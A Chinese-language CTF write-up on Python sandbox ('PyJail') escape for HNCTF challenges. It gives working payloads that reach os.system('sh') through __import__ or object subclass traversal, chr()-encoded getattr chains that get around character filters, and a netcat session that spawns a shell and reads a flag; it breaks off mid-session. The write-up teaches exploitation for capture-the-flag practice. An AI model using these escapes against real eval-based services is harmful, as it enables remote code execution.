        <content type="html"><![CDATA[<h3 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h3><p>[<a href="https://zhuanlan.zhihu.com/p/578966149">PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com)</a></p><p><a href="http://lihuaxi.xjx100.cn/news/1475226.html?action=onClick">Python Jail 沙盒逃逸 合集 (xjx100.cn)</a></p><p><a href="https://www.cnblogs.com/mumuhhh/p/17811377.html">Jail 【Python沙箱逃逸问题合集】 - Kicky_Mu - 博客园 (cnblogs.com)</a></p><h3 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法"></a> 魔术方法</h3><ul><li><ul><li><code>__init__</code>：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。</li><li><code>__len__</code>：返回对象的长度。对一个对象<code>a</code>使用<code>len(a)</code>时，会尝试调用<code>a.__len__()</code>。这个做炼丹的同学应该很熟悉，例如要通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法；</li><li><code>__str__</code>：返回对象的字符串表示。对一个对象<code>a</code>使用<code>str(a)</code>时，会尝试调用<code>a.__str__()</code>。这在我们自己实现一些类，譬如复数、二叉树、有限域、椭圆曲线等时，通过实现该方法，能将对象的内容较好地打印出来。（<code>print</code>函数中也会自动调用对象的<code>__str__</code>方法）相似地，还有<code>__int__</code>魔术方法也用于类型转换，不过较少使用；</li><li><code>__getitem__</code>：根据索引返回对象的某个元素。对一个对象<code>a</code>使用<code>a[1]</code>时，会尝试调用<code>a.__getitem__(1)</code>。同样，当我们通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法。有<code>__getitem__</code>，自然也有对应的<code>__setitem__</code>；</li><li><code>__add__</code>、<code>__sub__</code>、<code>__mul__</code>、<code>__div__</code>、<code>__mod__</code>：算术运算，加减乘除模。如对一个对象<code>a</code>使用<code>a+b</code>时，会尝试调用<code>a.__add__(b)</code>。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现<code>__radd__</code>、<code>__rsub__</code>、<code>__rmul__</code>、<code>__rdiv__</code>、<code>__rmod__</code>，如椭圆曲线上的点的倍点运算<code>G -&gt; d * G</code>，就可以通过实现<code>__rmul__</code>来实现。</li><li><code>__and__</code>，<code>__or__</code>、<code>__xor__</code>：逻辑运算，和算术运算类似；</li><li><code>__eq__</code>，<code>__ne__</code>、<code>__lt__</code>、<code>__gt__</code>、<code>__le__</code>、<code>__ge__</code>：比较运算，和算术运算类似；例如<code>'贵州' &gt; '广西'</code>，就会转而调用<code>'贵州'.__gt__('广西')</code>；</li><li><code>__getattr__</code>：对象是否含有某属性。如果我们对对象<code>a</code>所对应的类实现了该方法，那么在调用未实现的<code>a.b</code>时，就会转而调用<code>a.__getattr__(b)</code>。这也等价于用函数的方法调用：<code>getattr(a, 'b')</code>。有<code>__getattr__</code>，自然也有对应的<code>__setattr__</code>；</li><li><code>__subclasses__</code>：返回当前类的所有子类。一般是用在<code>object</code>类中，在<code>object.__subclasses__()</code>中，我们可以找到<code>os</code>模块中的类，然后再找到<code>os</code>，并且执行<code>os.system</code>，实现RCE。</li></ul></li><li><code>dir</code>：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过<code>getattr</code>来拿到目标方法。</li><li><code>chr</code>、<code>ord</code>：字符与ASCII码转换函数，能帮我们绕过一些WAF</li><li><code>globals</code>：返回所有全局变量的函数；</li><li><code>locals</code>：返回所有局部变量的函数；</li><li><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__('os')</code>；</li><li><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们python一般写的<code>if __name__ == '__main__':</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。更多参考<a href="https://link.zhihu.com/?target=https%3A//www.geeksforgeeks.org/__name__-a-special-variable-in-python/">这里</a>；</li><li><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__('os').system('sh')</code>进行RCE；</li><li><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的python文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</li><li><code>_</code>：该变量返回上一次运行的python语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</li></ul><p><strong>breakpoint 函数</strong></p><p>breakpoint()是3.7以后引入的内置函数，可以用于断点调试</p><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p><p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p><h3 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h3><p>优先考虑RCE起手式一种是 os.system(‘sh’)进入交互终端，另一种是os.popen(‘ls’).read()</p><p>object.<strong>subclasses</strong>()<code>中找到</code>os<code>模块中的类（一般是</code>&lt;class ‘os._wrap_close’&gt;<code>），另一种是先拿到</code><strong>builtins</strong><code>，再</code><strong>import</strong>(‘os’).system(‘sh’)</p><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><h4 id="calc_jail_beginner"><a class="markdownIt-Anchor" href="#calc_jail_beginner"></a> calc_jail_beginner</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Your goal is to read ./flag.txt</span><span class="token comment">#You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _     ______      _                              _       _ _  | |   |  ____|    (_)                            | |     (_) | | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| | | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | | | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | | |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|               __/ |                                                         |___/                                            '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以根据提示构建payload得到flag</p><p>也可以get交互式shell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28782</span>  _     ______      _                              _       _ _ <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">|</span>  ____<span class="token operator">|</span>    <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                            <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__ <span class="token operator">|</span> <span class="token operator">|</span>__   __ _ _ _ __  _ __   ___ _ __       <span class="token operator">|</span> <span class="token operator">|</span> __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \|  __| / _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>  _   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>___<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>    <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span><span class="token operator">|</span>______\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>     \____<span class="token operator">/</span> \__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>               __<span class="token operator">/</span> <span class="token operator">|</span>              <span class="token operator">|</span>___<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span><span class="token operator">></span>  <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ lsflag  server<span class="token punctuation">.</span>py$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>fb867efc<span class="token operator">-</span>bcf4<span class="token operator">-</span>4f2b<span class="token operator">-</span>b340<span class="token operator">-</span>41ee9ad4a5e8<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level1"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level1"></a> calc_jail_beginner_level1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#the function of filter will banned some string ',",i,b</span><span class="token comment">#it seems banned some payload </span><span class="token comment">#Can u escape it?Good luck!</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'"\'`ib'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _                _                           _       _ _   _                _ __  | |              (_)                         (_)     (_) | | |              | /_ | | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || | | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || | | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || | |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|              __/ |                          _/ |                                               |___/                          |__/                                                                                      '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说，我们能通过<code>eval</code>执行任意命令，但是命令不能包含双引号、单引号、反引号、字母<code>i</code>和字母<code>b</code>。许多命令，如<code>import</code>、<code>__builtins__</code>、<code>bytes</code>都无法用。</p><p>Show subclasses with tuple开始</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>b用不了，因此想到getattr()</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">,</span> <span class="token string">'__base__'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是引号都被banl，可以使用chr函数</p><p>‘<strong>base</strong>’</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>subclasses</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>绕过WAF</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到os 在 ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong><a href="'sh'">’system’</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>绕过WAF</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进如shell交互界面</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># nc node5.anna.nssctf.cn 28230</span>  _                _                           _       _ _   _                _ __ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">/</span>_ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token 